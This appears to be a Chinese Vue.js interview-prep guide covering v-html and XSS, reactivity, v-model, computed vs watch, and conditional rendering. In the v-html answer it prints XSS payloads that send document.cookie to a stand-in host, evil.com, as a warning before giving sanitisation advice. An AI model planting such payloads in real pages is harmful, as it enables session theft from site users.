**使用 Composition API：**

- Vue 3 项目（默认）
- 复杂组件
- 需要逻辑复用
- 需要 TypeScript

**知识点：** `Options API` `Composition API` `composables`

:::

---

## 总结

| 知识点 | 重要度 | 面试频率 |
|--------|--------|----------|
| Vue 3 新特性 | 🔥🔥🔥 | 🔥🔥🔥 |
| 双向绑定原理 | 🔥🔥🔥 | 🔥🔥🔥 |
| computed vs watch | 🔥🔥 | 🔥🔥🔥 |
| v-if vs v-show | 🔥🔥 | 🔥🔥 |
| 组件通信 | 🔥🔥🔥 | 🔥🔥🔥 |
| key 的作用 | 🔥🔥 | 🔥🔥 |
| nextTick | 🔥🔥 | 🔥🔥 |
| scoped 样式 | 🔥 | 🔥 |
| 生命周期 | 🔥🔥 | 🔥🔥🔥 |
| API 风格对比 | 🔥🔥 | 🔥🔥 |

**面试建议：**

- 重点掌握 Vue 3 vs Vue 2 的区别
- 理解响应式原理
- 熟悉 Composition API 的使用模式
- 能够手写简单的 composable 函数

---
### Q11: v-html 会导致什么问题？如何避免？

> **⭐ 简单 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**v-html 会导致 XSS 攻击！** 它直接将 HTML 插入 DOM，不经过转义。

```html
<!-- ❌ 危险：XSS 攻击 -->
<div v-html="userInput"></div>

<!-- 如果 userInput 是：-->
<!-- <img src=x onerror="alert(document.cookie)"> -->
<!-- 会执行恶意脚本！-->

<script>
// 恶意输入示例
const userInput = `
  <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
  <script>document.location='https://evil.com?cookie='+document.cookie<\/script>
`
</script>
```

**安全使用方式：**

```js
// 1. 只在可信内容上使用 v-html
const trustedHTML = marked(markdownContent) // Markdown 渲染

// 2. 服务端过滤/前端 sanitize
import DOMPurify from 'dompurify'
const cleanHTML = DOMPurify.sanitize(userInput)
// <div v-html="cleanHTML"></div>

// 3. 使用文本插值替代（自动转义）
<p>{{ userInput }}</p>  <!-- ✅ 自动转义，安全 -->

// 4. Vue 配置全局sanitize
// 不推荐，应在数据层清洗
```

| 方式 | 安全 | 说明 |
|------|------|------|
| `{{ }}` 插值 | ✅ | 自动转义 HTML |
| v-html + 不可信内容 | ❌ | XSS 风险 |
| v-html + DOMPurify | ✅ | 清洗后安全 |
| v-html + 可信内容 | ✅ | 服务端渲染的Markdown等 |

**知识点：** `v-html` `XSS` `DOMPurify` `内容安全` `转义`

:::

### Q12: Vue 的响应式原理？Vue2 vs Vue3？

> **🔥 中等 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**Vue 2 响应式原理：Object.defineProperty**

```js
function reactive(obj) {
  Object.keys(obj).forEach(key => {
    let value = obj[key]
    Object.defineProperty(obj, key, {
      get() {
        console.log('读取', key)
        return value
      },
      set(newVal) {
        console.log('设置', key)
        value = newVal
        // 触发视图更新
      }
    })
  })
  return obj
}

// 缺点：
// 1. 无法检测对象属性的添加/删除
// 2. 无法检测数组索引/长度变化
// 3. 需要递归遍历所有属性
```

**Vue 2 解决方案：**
```js
// 添加响应式属性
this.$set(this.obj, 'newKey', value)

// 数组方法重写
['push', 'pop', 'shift', 'unshift', 'splice', 'sort', 'reverse']
  .forEach(method => {
    const original = Array.prototype[method]
    Array.prototype[method] = function(...args) {
      // 通知更新
      return original.apply(this, args)
    }
  })
```

**Vue 3 响应式原理：Proxy**

```js
function reactive(obj) {
  return new Proxy(obj, {
    get(target, key, receiver) {
      console.log('读取', key)
      const res = Reflect.get(target, key, receiver)
      // 依赖收集
      track(target, key)
      return isObject(res) ? reactive(res) : res
    },
    set(target, key, value, receiver) {
      console.log('设置', key)
      const res = Reflect.set(target, key, value, receiver)
      // 触发更新
      trigger(target, key)
      return res
    },
    deleteProperty(target, key) {
      const res = Reflect.deleteProperty(target, key)
      trigger(target, key)
      return res
    }
  })
}
```

**Vue 2 vs Vue 3 对比：**

| 维度 | Vue 2 | Vue 3 |
|------|-------|-------|
| 实现方式 | Object.defineProperty | Proxy |
| 对象属性增删 | ❌ 需 $set | ✅ 原生支持 |
| 数组索引修改 | ❌ 需特殊方法 | ✅ 原生支持 |
| Map/Set 支持 | ❌ | ✅ |
| 性能 | 递归遍历慢 | Proxy 懒代理快 |
| 代码体积 | 小 | 略大 |

**Vue 3 Ref 实现：**
```js
function ref(value) {
  return {
    get value() {
      track(this, 'value')
      return value
    },
    set value(newVal) {
      value = newVal
      trigger(this, 'value')
    }
  }
}
```

**知识点：** `响应式` `Object.defineProperty` `Proxy` `Vue2` `Vue3`

:::

### Q13: Vue 中 v-model 原理？自定义组件的 v-model？

> **🔥 中等 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**v-model 本质是语法糖：**

**Vue 2：**
```vue
<!-- 模板 -->
<input v-model="msg" />

<!-- 编译后 -->
<input 
  :value="msg" 
  @input="$event => msg = $event.target.value" 
/>
```

**Vue 3：**
```vue
<!-- 编译后 -->
<input 
  :value="msg" 
  @input="msg = $event.target.value" 
/>
```

**自定义组件 v-model（Vue 2）：**
```vue
<!-- 父组件 -->
<CustomInput v-model="searchText" />

<!-- 子组件 -->
<script>
export default {
  props: ['value'],
  emits: ['input'],
  template: `
    <input 
      :value="value" 
      @input="$emit('input', $event.target.value)"
    />
  `
}
</script>
```

**自定义组件 v-model（Vue 3）：**
```vue
<!-- 父组件 -->
<CustomInput v-model="searchText" />
<CustomInput v-model:title="pageTitle" />  <!-- 多个 v-model -->

<!-- 子组件 -->
<script setup>
const model = defineModel()  // Vue 3.4+
// 或
const props = defineProps(['modelValue'])
const emit = defineEmits(['update:modelValue'])
</script>

<template>
  <input 
    :value="modelValue" 
    @input="emit('update:modelValue', $event.target.value)"
  />
</template>
```

**Vue 3 多个 v-model：**
```vue
<!-- 父组件 -->
<UserName v-model:first-name="first" v-model:last-name="last" />

<!-- 子组件 -->
<script setup>
const firstName = defineModel('firstName')
const lastName = defineModel('lastName')
</script>
```

**修饰符：**
```vue
<!-- .lazy - change 事件同步 -->
<input v-model.lazy="msg" />

<!-- .number - 转数字 -->
<input v-model.number="age" />

<!-- .trim - 去空格 -->
<input v-model.trim="msg" />

<!-- 自定义修饰符 -->
<CustomInput v-model.capitalize="msg" />
<!-- 子组件中 $attrs.modelModifiers 获取 -->
```

**知识点：** `v-model` `双向绑定` `defineModel` `props` `自定义组件事件`

:::

### Q14: computed 和 watch 的区别？

> **🔥 中等 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**computed - 计算属性**

```js
// Options API
export default {
  data() {
    return { firstName: 'John', lastName: 'Doe' }
  },
  computed: {
    fullName() {
      return `${this.firstName} ${this.lastName}`
    },
    // 带 setter
    fullName: {
      get() {
        return `${this.firstName} ${this.lastName}`
      },
      set(val) {
        [this.firstName, this.lastName] = val.split(' ')
      }
    }
  }
}

// Composition API
const firstName = ref('John')
const lastName = ref('Doe')
const fullName = computed(() => `${firstName.value} ${lastName.value}`)
```

**watch - 侦听器**

```js
// Options API
watch: {
  // 侦听单个
  firstName(newVal, oldVal) {
    console.log('changed')
  },
  // 侦听多个
  all: [
    'firstName',
    'lastName',
    function() { /* 回调 */ }
  ],
  // 深度侦听
  user: {
    handler(newVal) {},
    deep: true,
    immediate: true
  }
}

// Composition API
watch(firstName, (newVal, oldVal) => {})
watch([firstName, lastName], ([newF, newL]) => {})
watch(obj, (newVal) => {}, { deep: true, immediate: true })
```

**computed vs watch 对比：**

| 维度 | computed | watch |
|------|----------|-------|
| 用途 | 派生状态 | 副作用/异步 |
| 缓存 | ✅ 有缓存 | ❌ 无缓存 |
| 异步 | ❌ 不支持 | ✅ 支持 |
| 返回值 | ✅ 有 | ❌ 无 |
| 立即执行 | N/A | immediate: true |
| 深度 | 自动 deeply | deep: true |

**使用场景：**

**用 computed：**
```js
// 1. 派生数据
const filtered = computed(() => items.filter(i => i.active))

// 2. 格式化展示
const formatted = computed(() => date.format('YYYY-MM-DD'))

// 3. 多个依赖的计算
const total = computed(() => price.value * quantity.value)
```

**用 watch：**
```js
// 1. 异步请求
watch(userId, async (id) => {
  const user = await fetchUser(id)
})

// 2. DOM 操作
watch(expanded, (val) => {
  if (val) nextTick(() => scrollToElement())
})

// 3. 清理副作用
watch(id, (newId, oldId, onCleanup) => {
  const controller = new AbortController()
  onCleanup(() => controller.abort())
  fetchData(newId, { signal: controller.signal })
})
```

**知识点：** `computed` `watch` `计算属性` `侦听器` `副作用`

:::

### Q15: v-if 和 v-show 的区别？v-for 和 v-if 为什么不能一起用？

> **🔥 中等 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**v-if vs v-show：**

| 维度 | v-if | v-show |
|------|------|--------|
| 实现 | 添加/删除 DOM | display: none |
| 初始渲染 | 惰性（false 不渲染） | 始终渲染 |
| 切换开销 | 高（创建/销毁） | 低（显示/隐藏） |
| 适用 | 不频繁切换 | 频繁切换 |

**示例：**
```vue
<!-- v-if - 惰性渲染 -->
<div v-if="visible">内容</div>
<!-- visible=false 时 DOM 不存在 -->

<!-- v-show - 始终渲染 -->
<div v-show="visible">内容</div>
<!-- visible=false 时 display:none -->

<!-- v-if 也支持 v-else-if / v-else -->
<div v-if="type === 'A'">A</div>
<div v-else-if="type === 'B'">B</div>
<div v-else>C</div>
```

**v-for 和 v-if 不能一起用：**

```vue
<!-- ❌ Vue 2 警告，Vue 3 不允许 -->
<li v-for="item in items" v-if="item.visible">
  {{ item.name }}
</li>

<!-- 原因：v-for 优先级高于 v-if -->
<!-- 每个 item 都会先渲染，再判断 v-if -->
<!-- 性能浪费：遍历所有 items，即使大部分被过滤 -->
```

**正确做法：**

**1. 计算属性过滤**
```vue
<template>
  <li v-for="item in visibleItems" :key="item.id">
    {{ item.name }}
  </li>
</template>

<script setup>
const visibleItems = computed(() => 
  items.value.filter(item => item.visible)
)
</script>
```

**2. 外层 v-if**
```vue
<ul v-if="items.length">
  <li v-for="item in items" :key="item.id">
    {{ item.name }}
  </li>
</ul>
```

**3. 内层 v-if（条件在每个 item 内部）**
```vue
<template v-for="item in items" :key="item.id">
  <li v-if="item.visible">{{ item.name }}</li>
</template>
```

**Vue 2 vs Vue 3：**
- Vue 2：v-for 优先级更高（仍不推荐一起用）
- Vue 3：同一元素上 v-if 和 v-for 会报错

**知识点：** `v-if` `v-show` `v-for` `条件渲染` `列表渲染`

:::
